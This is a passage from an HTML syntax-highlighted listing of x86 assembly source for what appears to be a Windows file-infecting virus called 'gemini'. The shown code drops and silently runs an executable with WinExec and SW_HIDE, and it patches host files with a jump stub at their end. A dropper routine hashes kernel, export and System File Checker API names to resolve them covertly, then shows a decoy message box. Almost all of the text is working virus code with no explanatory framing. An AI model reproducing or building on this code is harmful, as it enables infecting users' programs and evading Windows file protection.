        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">test_bits</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gemini_codeend</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gemini_exe</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">drop_exp</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gemini_exe</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movs</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expcrcstk.pWriteFile</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expcrcstk.pCloseHandle</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">host_ret</span><span class="sc0">                        </span><span class="sc1">;allow only 1 copy to run</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">SW_HIDE</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">expcrcstk.pWinExec</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">host_ret</span><span class="sc0">        </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">expcrcstk</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc5">host_patch</span><span class="sc0">      </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0e9h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'rgb!'</span><span class="sc0">                    </span><span class="sc1">;must be last bytes in file</span><span class="sc0">

</span><span class="sc5">gemini_codeend</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
</span><span class="sc5">gemini_exe</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">dropper</span><span class="sc0">         </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">expcrc_count</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">expnames</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">expcrcbegin</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_crcs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">krncrc_count</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">krnnames</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">krncrcbegin</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_crcs</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">sfccrc_count</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sfcnames</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sfccrcbegin</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">create_crcs</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">patch_host</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">txttitle</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">txtbody</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MessageBoxA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc5">create_crcs</span><span class="sc0">     </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">imul</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">create_loop</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">create_outer</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">8</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc5">create_inner</span><span class="sc0">    </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnb</span><span class="sc0">     </span><span class="sc5">create_skip</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4c11db7h</span><span class="sc0">                   </span><span class="sc1">;use generator polymonial (see IEEE 802)</span><span class="sc0">

</span><span class="sc5">create_skip</span><span class="sc0">     </span><span class="sc9">label</span><span class="sc0">   </span><span class="sc10">near</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">create_inner</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">              </span><span class="sc1">;carry set if not zero</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">                             </span><span class="sc1">;carry not altered by inc</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">create_outer</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">create_loop</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetCurrentProcess</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteProcessMemory</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">create_crcs</span><span class="sc0">     </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc9">end</span><span class="sc0">             </span><span class="sc5">dropper</span></div></body>
</html>
